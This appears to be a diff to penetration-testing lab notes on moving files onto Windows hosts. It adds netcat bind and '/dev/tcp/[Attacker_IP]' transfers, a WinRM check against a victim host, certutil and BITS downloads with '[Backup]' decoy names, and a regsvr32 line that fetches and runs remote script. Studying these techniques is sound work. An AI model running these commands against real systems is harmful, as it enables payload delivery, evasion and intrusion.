@@ -1,5 +1,23 @@
 # Downloading to Windows
 
+## Netcat
+
+### NetCat Receiving File via Bind Shell
+```powershell
+# Cmd prompt only.  < > don't work in PS
+nc -l -p [Port] > [Input_File]
+```
+
+### Ncat Receiving File via Bind Shell
+```powershell
+ncat -l -p [Port] --recv-only > [Input_File]
+```
+
+### NetCat Receiving File via Reverse Shell
+```powershell
+cat < /dev/tcp/[Attacker_IP]/[Port] > [Input_File]
+```
+
 
 ## PowerShell B64 Encode & Decode
 
@@ -27,36 +45,6 @@ Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 	Algorithm     Hash                                Path
 	---------     ----                                ----
 	MD5           4E301756A07DED0A2DD6953ABF015278    C:\Users\Public\id_rsa
-```
-
-
-## Misc
-
-### Certutil.exe
-```powershell
-certutil.exe -urlcache -f [Target_File_URL] [Output_File]
-```
-
-### BitsTransfer
-```powershell
-Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File]
-```
-
-### regsrv32.exe
-```powershell
-regsvr32.exe /s /n /u /i:[Target_File_URL] scrobj.dll
-```
-
-### BitsTransfer
-```powershell
-Import-Module BitsTransfer
-Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]"
-```
-
-### BitsTransfer w/ Authentication
-```powershell
-Import-Module BitsTransfer
-Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]" -Credential [Username\Domain]
 ```
 
 
@@ -168,6 +156,24 @@ C:\htb> copy n:\[Target_File]
 ```
 
 
+## WinRM
+- Ports 5985/HTTP & 5986/HTTPS
+- Reqs:
+	- Admin access
+	- Member of `Remote Management Users` group
+
+### Confirm WinRM port is Opn
+```powershell
+Test-NetConnection -ComputerName [Victim_Hostname] -Port 5985
+	ComputerName     : [Victim_Hostname]
+	RemoteAddress    : [Victim_IP]
+	RemotePort       : 5985
+	InterfaceAlias   : Ethernet0
+	SourceAddress    : [Pivot_IP]
+	TcpTestSucceeded : True
+```
+
+
 ## FTP
 
 ### Installing the FTP Server Python3 Module - pyftpdlib
@@ -259,6 +265,37 @@ passive
 # Windows
 quote pasv
 ```
+
+
+## Misc
+
+### Certutil.exe
+```powershell
+certutil.exe -urlcache -f [Target_File_URL] [Output_File]
+```
+
+### BitsTransfer
+```powershell
+Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File]
+```
+
+### regsrv32.exe
+```powershell
+regsvr32.exe /s /n /u /i:[Target_File_URL] scrobj.dll
+```
+
+### BitsTransfer
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]"
+```
+
+### BitsTransfer w/ Authentication
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]" -Credential [Username\Domain]
+```
+
 
 
 # Uploading from Windows
